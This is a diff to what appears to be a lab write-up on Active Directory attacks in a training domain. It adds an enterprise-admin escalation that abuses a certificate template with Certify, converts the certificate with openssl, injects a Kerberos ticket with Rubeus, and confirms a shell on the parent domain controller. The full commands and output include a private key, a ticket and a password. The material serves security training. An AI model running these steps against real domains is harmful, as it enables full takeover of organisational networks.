@@ -407,7 +407,8 @@ Certify completed in 00:00:18.0310140
 Use DA and ingect TGT:
 
 ```
-C:\Windows\system32>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\certificate.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\DA.pfx
+C:\Windows\system32>
+openssl.exe pkcs12 -in C:\AD\certificate.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\DA.pfx
 WARNING: can't open config file: /usr/local/ssl/openssl.cnf
 Enter Export Password:
 Verifying - Enter Export Password:
@@ -503,4 +504,182 @@ whoami
 us\administrator
 ```
 
-Same procedure for Enterprise ADmin
+The Same procedure for Enterprise ADmin:
+
+Obtain Enterprise administrator pfx request:
+```
+C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
+```
+```
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Request a Certificates
+
+[*] Current user context    : US\studentuser17
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : ForAdminsofPrivilegedAccessWorkstations
+[*] Subject                 : CN=studentuser17, CN=Users, DC=us, DC=techcorp, DC=local
+[*] AltName                 : Administrator
+
+[*] Certificate Authority   : Techcorp-DC.techcorp.local\TECHCORP-DC-CA
+
+[*] CA Response             : The certificate had been issued.
+[*] Request ID              : 32
+
+[*] cert.pem         :
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAtMOFjU18zXaLeURgdSP0wEaxvsjQOlMEnwRd7A4iYN+jj2P+
+viQIRped9MfOlkjA2eBTSWBvEgkSiUIxePkBptKDh5l1l8oAnG9kAXVU8kew7OIb
+uhSPrgDu5Nld9uwfa3kLjrKqulCEJQ0hQb+vqJKwH9GnQJi0CW4bhvBgEyPvdSGZ
+LVjDcFTjs4b++N7l6EMrf94DkZlVukEch0SfVGLJ548QvGfrhJhhphzj918ZqZk6
+YSSsQv3S8hrWvzl21uZUAGgNPij/J2tdWwkmBzdIiIgVyjjWggl2XqCnKQ5KDSAs
+Z6Wfq9BiybGsopDejeAzbgzNTEeHF92mGYmFFQIDAQABAoIBABsUd3t1sk6thbOD
+FNg3rMDpVlN4jglOypBv/QoSDABrQHuIxW8CwuKgcB9tl3tYJtv9CT0i30DabxZ0
+/ihbVW4Cd4Xm7YDx2CmXXmoBg9pP9ydlsDWuQuAUb7WFAtitAv/8wEh+Z6lFyqYq
+U2MgLlaYsx3xMJcyyTXocuNCO4JiTVEmOtleXaVsWxUV1NOurvaquYszKitDx8HE
+8j8Lc2l1rUPO8Lq1x9ipWk1UVUICqBfJRv5DEMammy94qVKB5d3vjS/Jz7R5gvdJ
+LLk9VA+LFHOB8w6RPA/DcFDhO8j4RaG5g/0r4VSfoASSYU7Ywf2xhtWuq90InkZR
+Q3C+/zkCgYEA0WxOkxuTX1CZDkytbXXayHvqZOaYT31VIhYVL3Wg4ytjHyCSCFMs
+LThsW+EqDlYwNgvbYVJ5iRxDNVPMkTlwwUG1F+JSWMUn24CYk1Nhs+qlMJ0aALAL
+bZ6cLeSOli60vunmTqPMSI5ZSoODJklFnkypydU5v4e4/cw/zqbrxiMCgYEA3Pd4
+cNRBbWl49xrK6rMO5Jj+mr5HmOX1lhxOB/pjlGYWzWrwm3sOGS6SeG1tASpJELav
+bzTkbBAqHWG2ZIVVw01l7aZ7GJdthQufvCW+JhuM05bIE7ufmZHTmPycjpmPPczx
+BXwYYB+uxfpLXcwFMWFmsFTwbPKXhiRcPovYT2cCgYEAvzflhuzm42D0X9ojgI7b
+9bMvknH7IJmP4k/HiE4fWU2EdCeJL5DCBYg/aKVvgSexXaf16CcmUcs8krSxVOjd
+y5fzgptkFSnv+rywk9TOoTjfHERWOcqEpNLuR/kpOHftEWUApU1qedWAMklittKw
+fpoBbgkDcZ67iwG0QTyoi4ECgYEAiHTrFAKARSkVYsRQ+4+IavNwh+9qF6ord4AT
+UCn4xPQmsMSRwfLEShjQqz4oSsfqR0AKJwrq5TE2UN6+3GTbCbkKcTCWZCFfqQH8
+qxxDyRTKawB6nnUHorbDjX6yz/1U0D13uoNgKjxmmixvzoTn0A7uc4aA00cc++II
+dTe3ZZECgYAxvcxqw09oN5788qBlBvFi4QXTSO7pjcPA/PnGiAg9eCJsF6fUJq3L
+oq57lK1B2nSEY66LEybIXEX5VJS9+IBNxhDeNobmiMwpiOZuIYHDJRZbSL0yamka
+Eg4V9GFf3eL+FLQxVuSIgG5tfEZ2OZBjKx2In9wTD03RRXn0dmGckg==
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIGSDCCBTCgAwIBAgITdwAAACB+WTs9vreLAgAAAAAAIDANBgkqhkiG9w0BAQsF
+ADBKMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGDAWBgoJkiaJk/IsZAEZFgh0ZWNo
+Y29ycDEXMBUGA1UEAxMOVEVDSENPUlAtREMtQ0EwHhcNMjMwMjIyMTkyMzI4WhcN
+MjQwMjIyMTkyMzI4WjBtMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGDAWBgoJkiaJ
+k/IsZAEZFgh0ZWNoY29ycDESMBAGCgmSJomT8ixkARkWAnVzMQ4wDAYDVQQDEwVV
+c2VyczEWMBQGA1UEAxMNc3R1ZGVudHVzZXIxNzCCASIwDQYJKoZIhvcNAQEBBQAD
+ggEPADCCAQoCggEBALTDhY1NfM12i3lEYHUj9MBGsb7I0DpTBJ8EXewOImDfo49j
+/r4kCEaXnfTHzpZIwNngU0lgbxIJEolCMXj5AabSg4eZdZfKAJxvZAF1VPJHsOzi
+G7oUj64A7uTZXfbsH2t5C46yqrpQhCUNIUG/r6iSsB/Rp0CYtAluG4bwYBMj73Uh
+mS1Yw3BU47OG/vje5ehDK3/eA5GZVbpBHIdEn1RiyeePELxn64SYYaYc4/dfGamZ
+OmEkrEL90vIa1r85dtbmVABoDT4o/ydrXVsJJgc3SIiIFco41oIJdl6gpykOSg0g
+LGeln6vQYsmxrKKQ3o3gM24MzUxHhxfdphmJhRUCAwEAAaOCAwIwggL+MD4GCSsG
+AQQBgjcVBwQxMC8GJysGAQQBgjcVCIW5wzuGgYcDg5WPEIKezyOD0cIbgQCE3O12
+ho3hJQIBZAIBCzApBgNVHSUEIjAgBggrBgEFBQcDAgYIKwYBBQUHAwQGCisGAQQB
+gjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcVCgQoMCYwCgYIKwYBBQUH
+AwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkqhkiG9w0BCQ8ENzA1MA4G
+CCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYFKw4DAgcwCgYIKoZIhvcN
+AwcwHQYDVR0OBBYEFGKeV5/bUkhL/sUFbERNrLKRsxX2MCgGA1UdEQQhMB+gHQYK
+KwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1UdIwQYMBaAFM4YvtTaG9ov
+MSEIc+2cFhORAO+RMIHTBgNVHR8EgcswgcgwgcWggcKggb+GgbxsZGFwOi8vL0NO
+PVRFQ0hDT1JQLURDLUNBLENOPVRlY2hjb3JwLURDLENOPUNEUCxDTj1QdWJsaWMl
+MjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERD
+PXRlY2hjb3JwLERDPWxvY2FsP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
+ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBwwYIKwYBBQUHAQEE
+gbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1URUNIQ09SUC1EQy1DQSxD
+Tj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049
+Q29uZmlndXJhdGlvbixEQz10ZWNoY29ycCxEQz1sb2NhbD9jQUNlcnRpZmljYXRl
+P2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG
+9w0BAQsFAAOCAQEAJOxlCtcZW3kSkrJrbsbS6gdIxTyJLkg5NU79EI5VWP5j89Jz
+6I+2YNReZNC3zbRws3upwpdTx+vWf07HxmpDZ7GjUsW1+SsE/t/7rQ8mXVlN8anf
+C7BsQCkBhCQsW/QT5R5TWd7WKLNbAbgvLuvXUvpqjbofYsi5vM0a8LVqo5OE40Yq
+nA9tOCnMycKBqBBu7f5CRqsZ74I7+CaJACAzLxYlivDaShpQn69ja2ByHUn3Go4X
+RzQvnZyAUSgpaamDNr3Rv2pKOdP/LXDxudcpFs6mJArxoiJlHz2jKGRchdwAPb8O
+ru3bCxPteigbzmvqpL5xMMzHA7m1VOxDZ5lTWg==
+-----END CERTIFICATE-----
+
+
+[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+
+
+Certify completed in 00:00:14.5427698
+
+```
+C:\Users\studentuser17>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\certEA.perm -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\EA.pfx
+WARNING: can't open config file: /usr/local/ssl/openssl.cnf
+Enter Export Password:
+Verifying - Enter Export Password:
+unable to write 'random state'
+
+
+```
+C:\Users\studentuser17>C:\AD\Tools\Rubeus.exe asktgt /user:techcorp.local\Administrator /dc:techcorp-dc.techcorp.local /certificate:C:\AD\EA.pfx /password:SecretPass@123 /nowrap /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=studentuser17, CN=Users, DC=us, DC=techcorp, DC=local
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'techcorp.local\Administrator'
+[*] Using domain controller: 192.168.1.1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/techcorp.local
+  ServiceRealm             :  TECHCORP.LOCAL
+  UserName                 :  Administrator
+  UserRealm                :  TECHCORP.LOCAL
+  StartTime                :  2/22/2023 11:38:46 AM
+  EndTime                  :  2/22/2023 9:38:46 PM
+  RenewTill                :  3/1/2023 11:38:46 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  uc1Fd9swPYvbrVu6lJgqYw==
+  ASREP (key)              :  C87F05FAF09784B2001FE7E3FAA49E97
+
+```
+
+Enterprise admin Administrator validation on parent DC techcorp.local:
+
+```
+C:\Users\studentuser17>winrs -r:techcorp-dc cmd
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>hostname
+hostname
+Techcorp-DC
+
+C:\Users\Administrator>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet 3:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::aca0:24e4:b833:6648%5
+   IPv4 Address. . . . . . . . . . . : 192.168.1.1
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.1.254
+
+C:\Users\Administrator>whoami
+whoami
+techcorp\administrator
+```
+
+
